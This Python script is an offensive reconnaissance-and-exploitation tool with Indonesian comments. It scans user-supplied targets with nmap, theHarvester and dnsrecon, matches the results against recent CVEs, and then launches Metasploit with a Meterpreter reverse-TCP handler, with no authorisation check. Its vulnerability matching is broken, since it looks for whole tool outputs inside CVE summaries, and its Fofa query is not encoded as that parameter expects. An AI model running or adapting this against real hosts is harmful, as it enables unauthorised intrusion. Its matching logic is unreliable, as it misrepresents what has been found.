import requests
import subprocess
import os
import json
import logging
from tqdm import tqdm

# Konfigurasi logging
logging.basicConfig(filename='recon.log', level=logging.INFO)

# API Konstanta
CVE_API_URL = 'https://cve.circl.lu/api/last'
FOFA_API_URL = 'https://fofa.info/api/v1/search/all'
FOFA_API_KEY = 'Your Key'  # Ganti dengan API key Fofa Anda
DRIFNET_API_URL = 'https://api.driftnet.io/v1/search'
DRIFNET_API_KEY = 'Your Key'  # Ganti dengan API key Driftnet Anda
OPENAI_API_KEY = 'Your Key'  # Ganti dengan API key OpenAI Anda

def print_banner():
    """Print the banner for the tool."""
    banner = r"""
███████╗██╗  ██╗██████╗ ███████╗██████╗ ████████╗██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
██╔════╝╚██╗██╔╝██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
█████╗   ╚███╔╝ ██████╔╝█████╗  ██████╔╝   ██║   ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
██╔══╝   ██╔██╗ ██╔═══╝ ██╔══╝  ██╔══██╗   ██║   ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
███████╗██╔╝ ██╗██║     ███████╗██║  ██║   ██║   ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝

                       v1 by sudo3rs
    """
    print(banner)

def fetch_cve_data():
    """Ambil data CVE terbaru dari API."""
    try:
        response = requests.get(CVE_API_URL)
        if response.status_code == 200:
            cve_data = response.json()
            return cve_data
        else:
            logging.error("Error fetching CVE data: %s", response.text)
            return []
    except Exception as e:
        logging.error("Exception while fetching CVE data: %s", str(e))
        return []

def query_fofa(target):
    """Query API Fofa untuk informasi tentang target."""
    try:
        query = f'host="{target}"'
        params = {
            'email': 'Your Email',  # Ganti dengan email Fofa Anda
            'key': FOFA_API_KEY,
            'size': 10,
            'qbase64': query.encode('utf-8').decode('utf-8')
        }
        response = requests.get(FOFA_API_URL, params=params)
        if response.status_code == 200:
            return response.json().get('results', [])
        else:
            logging.error("Error querying Fofa API: %s", response.text)
            return []
    except Exception as e:
        logging.error("Exception while querying Fofa API: %s", str(e))
        return []

def query_driftnet(target):
    """Query API Driftnet untuk informasi tentang target."""
    try:
        headers = {
            'Authorization': f'Bearer {DRIFNET_API_KEY}'
        }
        params = {
            'query': target,
            'size': 10
        }
        response = requests.get(DRIFNET_API_URL, headers=headers, params=params)
        if response.status_code == 200:
            return response.json().get('data', [])
        else:
            logging.error("Error querying Drifnet API: %s", response.text)
            return []
    except Exception as e:
        logging.error("Exception while querying Drifnet API: %s", str(e))
        return []

def perform_nmap_scan(target):
    """Melakukan pemindaian Nmap pada target."""
    print(f"[+] Scanning {target} with Nmap...")
    try:
        result = subprocess.run(['nmap', '-sV', target], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            logging.error("Nmap scan failed: %s", result.stderr)
            return None
    except Exception as e:
        logging.error("Error during Nmap scan: %s", str(e))
        return None

def perform_theharvester(target):
    """Melakukan pengumpulan informasi menggunakan theHarvester."""
    print(f"[+] Gathering information with theHarvester for {target}...")
    try:
        result = subprocess.run(['theharvester', '-d', target, '-b', 'google'], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            logging.error("theHarvester failed: %s", result.stderr)
            return None
    except Exception as e:
        logging.error("Error during theHarvester: %s", str(e))
        return None

def perform_dnsrecon(target):
    """Melakukan reconnaissance DNS menggunakan dnsrecon."""
    print(f"[+] Performing DNS reconnaissance for {target}...")
    try:
        result = subprocess.run(['dnsrecon', '-d', target], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            logging.error("DNSRecon failed: %s", result.stderr)
            return None
    except Exception as e:
        logging.error("Error during DNSRecon: %s", str(e))
        return None

def match_vulnerabilities(recon_data, cve_data):
    """Mencocokkan data reconnaissance dengan kerentanan yang ditemukan."""
    vulnerabilities = []
    
    # Filter out None values from recon_data
    valid_services = [service for service in recon_data.values() if service is not None]

    # Periksa setiap CVE dan cocokkan dengan data reconnaissance
    for cve in cve_data:
        # Pastikan kunci yang diperlukan ada dalam data CVE
        cve_summary = cve.get('summary', '')  # Gunakan get untuk menghindari KeyError
        cve_id = cve.get('id', 'Unknown CVE ID')  # Ambil ID CVE jika ada

        # Logika pencocokan kerentanan
        if any(service in cve_summary for service in valid_services):
            vulnerabilities.append({
                "id": cve_id,
                "description": cve_summary,
                "references": cve.get('references', [])
            })
    
    return vulnerabilities

def exploit_with_metasploit(target):
    """Opsi eksploitasi otomatis menggunakan Metasploit."""
    print(f"[+] Starting Metasploit for {target}...")
    # Contoh perintah untuk memulai Metasploit
    subprocess.run(['msfconsole', '-x', f'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST your_ip; set LPORT 4444; exploit'])

def chatgpt_analysis(data):
    """Interaksi dengan OpenAI untuk analisis data reconnaissance."""
    headers = {
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {OPENAI_API_KEY}',  # Gunakan API key OpenAI
    }
    payload = {
        "model": "gpt-3.5-turbo",
        "messages": [{"role": "user", "content": f"Analyze the following reconnaissance data and suggest vulnerabilities: {data}"}],
        "max_tokens": 150
    }
    
    response = requests.post('https://api.openai.com/v1/chat/completions', headers=headers, json=payload)
    if response.status_code == 200:
        return response.json()['choices'][0]['message']['content']
    else:
        logging.error("Error communicating with ChatGPT: %s", response.text)
        return None

def get_targets():
    """Input target dari prompt atau membaca dari file."""
    target_input = input("Enter a single target IP/domain or the path to a file containing targets: ")
    
    if os.path.isfile(target_input):
        with open(target_input, 'r') as file:
            targets = [line.strip() for line in file if line.strip()]
    else:
        targets = [target_input.strip()]
    
    return targets

def main():
    # Print the banner
    print_banner()

    # Ambil target
    targets = get_targets()
    
    for target in targets:
        print(f"\n[+] Processing target: {target}")
        
        # Lakukan reconnaissance
        recon_data = {}
        
        # Show progress for each reconnaissance step
        steps = ['Nmap Scan', 'theHarvester', 'DNS Recon']
        for step in tqdm(steps, desc="Processing", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
            if step == 'Nmap Scan':
                recon_data['nmap'] = perform_nmap_scan(target)
            elif step == 'theHarvester':
                recon_data['theharvester'] = perform_theharvester(target)
            elif step == 'DNS Recon':
                recon_data['dnsrecon'] = perform_dnsrecon(target)

        # Ambil data CVE
        cve_data = fetch_cve_data()

        # Mencocokkan kerentanan
        vulnerabilities = match_vulnerabilities(recon_data, cve_data)
        if vulnerabilities:
            print(f"\n[+] Vulnerabilities found for {target}:")
            for vuln in vulnerabilities:
                print(f"  - CVE ID: {vuln['id']}, Description: {vuln['description']}")
            # Opsi eksploitasi
            exploit_with_metasploit(target)
        else:
            print(f"[!] No vulnerabilities found for {target}.")
            print("    Possible reasons:")
            print("    - The target may be well-secured with no known vulnerabilities.")
            print("    - The reconnaissance tools may not have detected any exploitable services.")
            print("    - The target may not be running any services that are listed in the CVE database.")
            print("    - Ensure that the target is reachable and correctly specified.")
            print("    Possible risks:")
            print("    - Even if no vulnerabilities are found, the target may still be susceptible to zero-day exploits.")
            print("    - Misconfigurations or outdated software may exist that are not publicly documented.")
            print("    - Continuous monitoring and regular security assessments are recommended.")

if __name__ == "__main__":
    main()
